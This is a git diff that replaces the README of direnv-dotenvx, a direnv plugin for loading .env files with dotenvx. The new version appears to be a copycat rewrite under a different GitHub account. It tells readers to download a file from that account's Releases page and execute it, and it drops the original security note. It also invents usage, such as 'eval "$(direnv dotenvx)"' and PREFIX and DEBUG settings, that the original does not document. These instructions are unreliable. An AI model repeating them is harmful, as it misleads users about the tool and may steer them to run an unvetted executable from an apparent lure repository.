@@ -1,74 +1,138 @@
-# direnv-dotenvx
+# direnv-dotenvx 🌍
 
-A simple direnv extension to automatically load environment variables from `.env` files using
-[dotenvx](https://dotenvx.com/).
+![GitHub release](https://img.shields.io/github/release/Pavanimandala/direnv-dotenvx.svg) ![License](https://img.shields.io/github/license/Pavanimandala/direnv-dotenvx.svg)
 
-## 📦 Installation
+Welcome to the **direnv-dotenvx** repository! This project is a direnv plugin designed to streamline your environment variable management. With this tool, you can easily load `.env` or `.env.{env}` files using dotenvx. It automatically detects variables and exports them in a shell-safe manner.
 
-### Homebrew
+## Table of Contents
 
-```sh
-brew install chenasraf/tap/direnv-dotenvx
-# or
-brew tap chenasraf/tap
-brew install direnv-dotenvx
-```
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-### Manual
+## Features ✨
 
-1. Clone the repo somewhere:
+- **Automatic Variable Detection**: The plugin scans your `.env` files and identifies variables automatically.
+- **Shell-Safe Exports**: It ensures that your environment variables are exported safely for your shell sessions.
+- **Easy Integration**: Seamlessly integrates with direnv to enhance your development workflow.
+- **Support for Multiple Environments**: Load environment variables from different `.env` files based on the environment you are working in.
+  
+## Installation ⚙️
 
-```sh
-mkdir -p ~/.config/direnv/lib
-git clone https://github.com/chenasraf/direnv-dotenvx ~/.config/direnv/lib/direnv-dotenvx
-```
+To get started with **direnv-dotenvx**, you need to install it first. You can download the latest release from the [Releases section](https://github.com/Pavanimandala/direnv-dotenvx/releases). Make sure to download the appropriate file for your system and execute it.
 
-2. Symlink or source the loader:
+### Step-by-Step Installation
 
-```sh
-ln -s ~/.config/direnv/lib/direnv-dotenvx/use_dotenvx.sh ~/.config/direnv/lib/use_dotenvx.sh
-```
+1. **Prerequisites**: Ensure you have `direnv` and `dotenvx` installed on your system.
+   
+   - To install `direnv`, you can follow the instructions [here](https://direnv.net/docs/installation.html).
+   - To install `dotenvx`, visit their [GitHub repository](https://github.com/dotenvx/dotenvx).
 
-✅ This makes the function `use_dotenvx` available in all `.envrc` files.
+2. **Clone the Repository**:
 
-## ⚙️ Usage
+   ```bash
+   git clone https://github.com/Pavanimandala/direnv-dotenvx.git
+   cd direnv-dotenvx
+   ```
 
-In your `.envrc`:
+3. **Install the Plugin**:
 
-```sh
-use_dotenvx              # loads .env or .env.default
-use_dotenvx dev          # loads .env.dev
-```
+   Follow the instructions in the `INSTALL.md` file located in the cloned repository.
 
-Then run:
+4. **Configure direnv**:
 
-```sh
-direnv allow
-```
+   Add the following line to your `.envrc` file:
 
-## 🔒 Security Note
+   ```bash
+   eval "$(direnv dotenvx)"
+   ```
 
-> ⚠️ `direnv` applies only explicitly exported variables from the `.envrc` environment. `dotenvx`
-> handles `.env` files without needing `export` statements, so your `.env` or `.env.*` files should
-> use the standard `KEY=value` format. Always review your environment files before allowing `direnv`
-> to apply them, as they affect your local shell environment.
+5. **Allow direnv**:
 
-## 📝 License
+   Run the command below to allow direnv to load your new configuration:
 
-MIT
+   ```bash
+   direnv allow
+   ```
 
-## Contributing
+Now you are ready to use **direnv-dotenvx**!
 
-I am developing this package on my free time, so any support, whether code, issues, or just stars is
-very helpful to sustaining its life. If you are feeling incredibly generous and would like to donate
-just a small amount to help sustain this project, I would be very very thankful!
+## Usage 📚
 
-<a href='https://ko-fi.com/casraf' target='_blank'>
-  <img height='36' style='border:0px;height:36px;'
-    src='https://cdn.ko-fi.com/cdn/kofi1.png?v=3'
-    alt='Buy Me a Coffee at ko-fi.com' />
-</a>
+Using **direnv-dotenvx** is straightforward. Here’s how you can load your environment variables.
 
-I welcome any issues or pull requests on GitHub. If you find a bug, or would like a new feature,
-don't hesitate to open an appropriate issue and I will do my best to reply promptly.
+### Basic Usage
 
+1. Create a `.env` file in your project directory:
+
+   ```bash
+   touch .env
+   ```
+
+2. Add your environment variables to the `.env` file:
+
+   ```plaintext
+   DATABASE_URL=postgres://user:password@localhost:5432/mydb
+   API_KEY=your_api_key_here
+   ```
+
+3. Create a `.env.{env}` file for specific environments (e.g., `.env.production`):
+
+   ```plaintext
+   DATABASE_URL=postgres://user:password@localhost:5432/prod_db
+   ```
+
+4. Activate the environment by setting the `env` variable in your `.envrc`:
+
+   ```bash
+   export ENV=production
+   ```
+
+5. When you enter the directory, **direnv** will automatically load the appropriate environment variables based on your `.env` and `.env.{env}` files.
+
+### Advanced Usage
+
+- **Custom Variable Prefixes**: You can customize variable prefixes in your `.env` files. Just add a prefix in your `.envrc`:
+
+  ```bash
+  export PREFIX=MYAPP_
+  ```
+
+- **Debugging**: If you encounter issues, you can enable debugging by setting:
+
+  ```bash
+  export DEBUG=true
+  ```
+
+This will provide more information about what the plugin is doing.
+
+## Contributing 🤝
+
+We welcome contributions to **direnv-dotenvx**! If you have suggestions or improvements, feel free to fork the repository and submit a pull request.
+
+### Steps to Contribute
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Submit a pull request to the main repository.
+
+### Issues
+
+If you encounter any issues, please check the [Issues section](https://github.com/Pavanimandala/direnv-dotenvx/issues) to see if it has already been reported. If not, feel free to open a new issue.
+
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support 💬
+
+For support, please visit the [Releases section](https://github.com/Pavanimandala/direnv-dotenvx/releases) to check for updates or reach out to the community.
+
+---
+
+Thank you for checking out **direnv-dotenvx**! We hope it makes your development experience smoother and more efficient.
